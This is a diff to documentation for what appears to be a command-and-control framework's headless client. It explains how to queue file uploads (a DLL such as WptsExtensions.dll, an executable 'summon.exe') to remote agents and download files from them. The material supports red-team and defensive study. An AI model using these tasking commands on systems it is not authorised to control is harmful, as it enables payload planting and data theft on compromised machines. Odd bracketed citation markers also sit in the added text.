@@ -69,7 +69,7 @@ The three commands above retrieve the machine `PATH`, the user `PATH`, and issue
 
 ### File uploads and downloads
 
-File operations use `CommandID 15` (`COMMAND_FS`). Supply a `SubCommand` string and the encoded `Arguments` value that the demon expects. Paths are UTF-8 strings encoded with base64, matching the GUI implementation in `CommandExecute::FS` and the server-side translation in `teamserver/pkg/agent/demons.go`.
+File operations use `CommandID 15` (`COMMAND_FS`). Supply a `SubCommand` string and the encoded `Arguments` value that the demon expects. Paths are UTF-8 strings encoded with base64, matching the GUI implementation in `CommandExecute::FS` and the server-side translation in `teamserver/pkg/agent/demons.go`. 【F:teamserver/cmd/headless/headless.go†L1059-L1140】
 
 ```text
 # Upload local DLL to %LOCALAPPDATA%\Temp
@@ -85,6 +85,20 @@ task <agent-id> 15 download SubCommand=download Arguments=Qzpcc2VjdXJpdHkudHh0
 ```
 
 Replace `<base64-data>` with the base64-encoded contents of the file you want to upload (for example, `base64 -w0 /home/kali/WptsExtensions.dll`). When you queue a download the server streams the file back through the standard transfer channel, exactly as if you had used the GUI.
+
+The CLI now mirrors the GUI workflow so you do not need to pre-encode the upload payload manually. Provide a local file path and the desired remote path separated by a semicolon and the client will read the file, base64-encode its contents, and encode the remote path for you:
+
+```text
+task <agent-id> 15 upload SubCommand=upload Arguments=/home/kali/summon.exe;".\summon.exe"
+```
+
+Alternatively, use the explicit `File` parameter when you want to control the remote path independently of the argument string:
+
+```text
+task <agent-id> 15 upload SubCommand=upload Arguments=".\summon.exe" File=@/home/kali/summon.exe
+```
+
+The `@` prefix instructs the headless client to read the referenced file, expand a leading `~`, and insert the base64 data before queueing the task. If you already have the base64 payload available, omit the prefix and the value will be passed through unchanged. 【F:teamserver/cmd/headless/headless.go†L1072-L1138】
 
 ### Local account management
 
